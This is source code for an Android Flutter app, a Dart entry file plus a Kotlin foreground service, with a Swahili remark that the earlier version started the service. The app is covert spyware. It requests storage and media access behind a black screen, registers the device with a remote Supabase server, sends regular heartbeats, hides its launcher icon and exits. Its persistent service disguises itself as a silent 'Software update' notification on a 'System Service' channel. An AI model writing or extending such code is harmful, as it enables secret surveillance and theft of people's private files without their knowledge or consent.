// lib/main.dart
import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/device_agent.dart';
import 'core/device_id.dart';

const String SUPABASE_URL =
    'https://kywpnhaermwldzcwtsnv.supabase.co';
const int HEARTBEAT_INTERVAL_SECONDS = 30;

const MethodChannel _permChannel =
    MethodChannel('cyber_agent/permissions');
const MethodChannel _appHider =
    MethodChannel('cyber_accessibility_agent/app_hider');

const String _prefSetupDone = 'setup_done';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MediaAgentApp());
}

class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: SilentSetupPage(),
    );
  }
}

class SilentSetupPage extends StatefulWidget {
  const SilentSetupPage({super.key});

  @override
  State<SilentSetupPage> createState() => _SilentSetupPageState();
}

class _SilentSetupPageState extends State<SilentSetupPage> {
  bool _agentStarted = false;
  Timer? _heartbeatTimer;
  Timer? _pollTimer;
  bool _closing = false;

  @override
  void initState() {
    super.initState();
    _silentInit();
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    _pollTimer?.cancel();
    super.dispose();
  }

  Future<void> _silentInit() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final setupDone = prefs.getBool(_prefSetupDone) ?? false;

      if (setupDone) {
        // Already set up in prior run: start agent if needed and immediately close UI
        await _startAgentIfNeeded();
        _closeAppSilently();
        return;
      }

      // First-run: invoke permission request (this shows system UI)
      // We call requestPermissions once, then poll for the result silently.
      try {
        await _permChannel.invokeMethod('requestPermissions');
      } catch (_) {
        // ignore
      }

      // Start polling for permission state every 1.5s. If granted -> proceed.
      int attempts = 0;
      const maxAttempts = 180; // ~4.5 minutes safety cap
      _pollTimer = Timer.periodic(const Duration(milliseconds: 1500), (_) async {
        attempts++;
        final ok = await _checkPermissions();
        if (ok) {
          _pollTimer?.cancel();
          await _onPermissionsGranted();
        } else if (attempts >= maxAttempts) {
          // stop polling to avoid infinite loop; remain silent / black screen
          _pollTimer?.cancel();
        }
      });
    } catch (_) {
      // ignore any unexpected error — keep UI silent
    }
  }

  Future<bool> _checkPermissions() async {
    try {
      final Map<dynamic, dynamic>? map =
          await _permChannel.invokeMethod('checkStoragePermissions');
      if (map == null) return false;
      return map['hasAllFilesAccess'] == true ||
          map['readMediaImages'] == true ||
          map['readMediaVideo'] == true ||
          map['readMediaAudio'] == true;
    } catch (_) {
      return false;
    }
  }

  Future<void> _onPermissionsGranted() async {
    if (_closing) return;
    _closing = true;

    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool(_prefSetupDone, true);
    } catch (_) {}

    await _startAgentIfNeeded();

    // hide icon (best-effort)
    try {
      await _appHider.invokeMethod<bool>('hide');
    } catch (_) {}

    // small delay to ensure service started
    await Future.delayed(const Duration(milliseconds: 300));

    // close app silently
    _closeAppSilently();
  }

  Future<void> _startAgentIfNeeded() async {
    if (_agentStarted) return;
    _agentStarted = true;

    try {
      final deviceId = await DeviceId.getOrCreate();
      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_URL,
        deviceId: deviceId,
      );

      // register + start
      await DeviceAgent.instance.register();
      await DeviceAgent.instance.start();

      // start heartbeat
      _heartbeatTimer?.cancel();
      _heartbeatTimer = Timer.periodic(
        const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
        (_) => DeviceAgent.instance.heartbeat(),
      );
    } catch (_) {
      // ignore errors here; service will try to operate and surface issues in logs
    }
  }

  void _closeAppSilently() {
    try {
      SystemNavigator.pop(animated: true);
    } catch (_) {
      if (Platform.isAndroid) {
        // fallback
        exit(0);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    // Completely black minimal UI — invisible to user while system permission flows.
    return const Scaffold(
      backgroundColor: Colors.black,
      body: SizedBox.expand(),
    );
  }
}


package com.example.cyber_accessibility_agent

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.embedding.engine.loader.FlutterLoader
import io.flutter.plugin.common.MethodChannel
import java.util.concurrent.Executors

class AgentService : Service() {

    companion object {
        const val CHANNEL_ID = "sys_core"
        const val NOTIF_ID = 1001
        // IMPORTANT: keep this name in sync with MainActivity/BootReceiver if they reference it
        const val ACTION_START = "agent_start"
    }

    private val TAG = "AgentService"
    private var flutterEngine: FlutterEngine? = null
    private val executor = Executors.newSingleThreadExecutor()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        Log.i(TAG, "Foreground AgentService started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // if caller used action, we could react, but we just ensure engine init happens once
        if (flutterEngine == null) {
            executor.execute { initFlutter() }
        }
        return START_STICKY
    }

    private fun initFlutter() {
        try {
            val loader = FlutterLoader()
            loader.startInitialization(applicationContext)
            loader.ensureInitializationComplete(applicationContext, null)

            val engine = FlutterEngine(applicationContext)

            val entrypoint = DartExecutor.DartEntrypoint(
                loader.findAppBundlePath(),
                "backgroundMain"
            )

            engine.dartExecutor.executeDartEntrypoint(entrypoint)

            MethodChannel(engine.dartExecutor.binaryMessenger, "agent/status")
                .setMethodCallHandler { call, result ->
                    if (call.method == "updateStatus") {
                        // intentionally ignored to keep notification static & minimal
                        result.success(true)
                    } else {
                        result.notImplemented()
                    }
                }

            flutterEngine = engine
            Log.i(TAG, "Headless FlutterEngine started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start FlutterEngine", e)
        }
    }

    override fun onDestroy() {
        try {
            flutterEngine?.destroy()
        } catch (e: Exception) {
            Log.w(TAG, "Error destroying flutterEngine", e)
        }
        flutterEngine = null
        executor.shutdownNow()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ---------------- Minimal Notification ----------------

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service", // short visible name for channel
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            try {
                nm.createNotificationChannel(channel)
            } catch (e: Exception) {
                Log.w(TAG, "createNotificationChannel failed", e)
            }
        }
    }

    private fun buildNotification(): Notification {
        // Use a drawable named ic_sys_dot if present; otherwise fall back to app launcher icon.
        val iconRes = resources.getIdentifier("ic_sys_dot", "drawable", packageName)
        val smallIcon = if (iconRes != 0) iconRes else try {
            // fallback to mipmap launcher (common)
            resources.getIdentifier("ic_launcher", "mipmap", packageName).takeIf { it != 0 } ?: R.mipmap.ic_launcher
        } catch (_: Exception) {
            R.mipmap.ic_launcher
        }

        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(smallIcon)
            .setContentTitle("Software update")
            .setContentText("Software update are available.")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)

        // On older platforms the empty title/text is allowed; we still provide a minimal ticker for system
        return builder.build()
    }
}

hii file ya awali ilikiwa agent service inaanza vizuri

